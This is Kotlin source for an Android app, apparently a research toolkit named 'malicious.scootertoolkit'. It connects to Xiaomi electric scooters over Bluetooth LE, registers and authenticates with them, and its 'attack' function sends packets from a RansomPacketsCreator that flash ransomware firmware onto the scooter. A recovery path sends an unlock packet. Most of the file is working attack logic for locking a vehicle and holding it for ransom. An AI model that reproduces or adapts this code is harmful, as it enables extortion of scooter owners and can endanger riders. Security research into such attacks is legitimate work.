package com.malicious.scootertoolkit.ble

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import com.malicious.scootertoolkit.ui.home.components.DeviceAdapter
import com.malicious.scootertoolkit.xiaomi.RansomPacketsCreator
import com.malicious.scootertoolkit.xiaomi.ScooterDevice
import com.malicious.scootertoolkit.xiaomi.miauth.AuthBase
import com.malicious.scootertoolkit.xiaomi.miauth.AuthCommand
import com.malicious.scootertoolkit.xiaomi.miauth.AuthLogin
import com.malicious.scootertoolkit.xiaomi.miauth.AuthRegister
import com.malicious.scootertoolkit.xiaomi.miauth.Commando
import com.malicious.scootertoolkit.xiaomi.miauth.Data
import com.malicious.scootertoolkit.xiaomi.miauth.DataLogin
import com.malicious.scootertoolkit.xiaomi.miauth.DataRegister
import io.reactivex.rxjava3.functions.Consumer


class BleMain private constructor (private val context: Context){

    companion object{
        private const val TAG = "BleMain"

        @SuppressLint("StaticFieldLeak")
        private var INSTANCE: BleMain? = null

        fun createInstance(context: Context) {
            if (INSTANCE == null) {
                synchronized(BleMain::class.java) {
                    if (INSTANCE == null) {
                        INSTANCE = BleMain(context)
                        Log.d(TAG,"BleManager instance created!")
                    }
                }
            }
        }
        fun getInstance(): BleMain? {
            if (INSTANCE == null) {
                Log.e(TAG,"BleManager instance not found!")
                return null
            }
            Log.d(TAG,"BleManager instance returned!")
            return INSTANCE
        }
    }


    private var mBTAdapter: BluetoothAdapter? = null
    private var bleScanner: BleScanner? = null
    private var scooterDevice: ScooterDevice? = null

    private var auth: AuthBase? = null
    private var data: Data = Data()

    init{
        checkBle()
    }
    
    fun getScanner(deviceAdapter: DeviceAdapter): BleScanner{
        Log.d(TAG,"Returning BleScanner")
        if (this.bleScanner != null)
            return this.bleScanner!!
        this.bleScanner = BleScanner(mBTAdapter!!, deviceAdapter)
        return this.bleScanner!!
    }

    private fun checkBle() {
        Log.d(TAG,"Checking Bluetooth availability")
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        mBTAdapter = manager.adapter
        if (mBTAdapter == null) {
            Toast.makeText(context, "Bluetooth not available!", Toast.LENGTH_SHORT).show()
        }
        if (!mBTAdapter!!.isEnabled) {
            Toast.makeText(context, "Bluetooth disabled!", Toast.LENGTH_SHORT).show()
        }
    }

    fun createBleDevice(device: BluetoothDevice, name: String) : Boolean {
        scooterDevice = ScooterDevice(context, device, name)
        scooterDevice!!.connect()
        Log.d(TAG,"Device $name created!")
        bleScanner?.stopScan()
        return isConnected()
    }

    fun isConnected() : Boolean{
        if(scooterDevice != null){
            return scooterDevice!!.isConnected
        }
        return false
    }

    fun getMacAddress() : String?{
        if(scooterDevice != null){
            return scooterDevice!!.getAddress()
        }
        return null
    }

    fun register(onSuccess: Consumer<Boolean>) {
        //TODO(improve registration speed)
        val dataRegister = DataRegister(data)
        scooterDevice?.disconnect()

        auth = AuthRegister(scooterDevice, dataRegister) { complete: Boolean ->
            onSuccess.accept(complete)
            if (complete) {
                // save token
                data = auth?.data!!
                scooterDevice?.setRegistered()
                Log.d(TAG, "Registration successful")
            } else {
                // disconnect device only and capture button press
                //scooterDevice?.disconnect()
                Handler(Looper.getMainLooper()).postDelayed({ auth?.exec() }, 5000)
            }
        }
        // send command to register
        auth!!.exec()

    }

    fun isRegistered() : Boolean{
        if(scooterDevice != null){
            return scooterDevice!!.isRegistered()
        }
        return false
    }

    fun authentication(onSuccess: Consumer<Boolean>){

        val dataLogin = DataLogin(data)
        auth = AuthLogin(scooterDevice, dataLogin){ complete: Boolean ->
            onSuccess.accept(complete)
            if (complete) {
                // save auth data
                data = auth?.data!!
                scooterDevice?.setAuthenticated()
            }
        }
        auth?.exec()
    }

    fun isAuthenticated() : Boolean{
        if(scooterDevice != null){
            return scooterDevice!!.isAuthenticated()
        }
        return false
    }

    fun testCommandSN(onSuccess : Consumer<ByteArray>){

        val dataCommand = DataLogin(data)
        val authCommand = AuthCommand(scooterDevice, dataCommand)
        authCommand.push(Commando("55aa0322013102".decodeHex()){ onResponse: ByteArray ->
            Log.d(TAG,onResponse.toString())
            onSuccess.accept(onResponse)
        })
        // send command to get serial number
        authCommand.exec()
        authCommand.sendNext()
    }

    fun attack(fw : RansomPacketsCreator.Companion.FW, onProgress : Consumer<Int>) {
        Log.d(TAG,"Launching attack")
        val packetCreator = RansomPacketsCreator(fw, context.resources)
        val initPacket : ByteArray = packetCreator.createInitPacket()
        val chunkPackets : ArrayList<ByteArray> = packetCreator.createChunkPacket()
        val checksumPackets : ByteArray = packetCreator.createChecksumPacket()
        val resetPacket : ByteArray = packetCreator.createResetPacket()
        val finalPacket : ByteArray = packetCreator.createFinalPacket()

        fun ByteArray.toHex(): String = joinToString(separator = "") { eachByte -> "%02x".format(eachByte) }

        if (RansomPacketsCreator.Companion.FW.RANSOM_RECOVER == fw){
            val unlockPacket : ByteArray? = packetCreator.createUnlockRansomwarePacket()
            Log.d(TAG,"UnlockRansom Packet  ${unlockPacket?.toHex()}")
            val dataCommand = DataLogin(data)
            val authCommand = AuthCommand(scooterDevice, dataCommand)
            authCommand.exec()
            authCommand.push(unlockPacket){}
        }

        Log.d(TAG,"Init Packet  ${initPacket.toHex()}")
        for ( chunk in chunkPackets ){
            Log.d(TAG, "Chunk packet  ${chunk.toHex()}")
        }
        Log.d(TAG,"Checksum Packet  ${checksumPackets.toHex()}")
        Log.d(TAG,"Reset Packet  ${resetPacket.toHex()}")
        Log.d(TAG,"Final Packet  ${finalPacket.toHex()}")

        chunkPackets.add(0,initPacket)
        chunkPackets.add(checksumPackets)
        chunkPackets.add(resetPacket)
        chunkPackets.add(finalPacket)
        /*if (fw!= RansomPacketsCreator.Companion.FW.RECOVER)
            chunkPackets.add(packetCreator.createChangeNamePacket())
*/
        //TODO(change scooter name at the end)

        val dataCommand = DataLogin(data)
        val authCommand = AuthCommand(scooterDevice, dataCommand)
        // send command to get serial number
        authCommand.exec()
        authCommand.burst(chunkPackets) { progress: Int ->
            Log.d(TAG, progress.toString())
            onProgress.accept(progress)
        }

    }

    private fun String.decodeHex(): ByteArray {
        check(length % 2 == 0) { "Must have an even length" }

        return chunked(2)
            .map { it.toInt(16).toByte() }
            .toByteArray()
    }

}